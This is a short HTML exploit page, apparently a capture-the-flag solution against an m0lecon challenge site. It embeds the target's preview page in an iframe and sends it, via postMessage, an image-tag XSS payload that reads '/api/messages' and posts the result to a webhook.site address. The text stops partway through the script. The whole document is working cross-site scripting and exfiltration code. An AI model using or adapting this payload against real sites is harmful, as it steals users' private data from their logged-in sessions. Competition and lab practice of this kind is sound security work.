<html>
<body>
<iframe id="f" src="https://c4be5b24-6c1f-4885-92bf-8881add9a1bd.offsec.m0lecon.it/preview"></iframe>
<script>
const WEBHOOK = "https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed";
const payload = `<img src=x onerror="
  (async function() {
    var data = await fetch('/api/messages').then(r=>r.text());
    await fetch('${WEBHOOK}', {
      method: 'POST',
      mode: 'no-cors',
      keepalive: true,
      body: data
    });
  })();
">`;
document.getElementById('f').onload = function() {
  document.getElementById('f').contentWindow.postMessage({ html: payload }, '*');
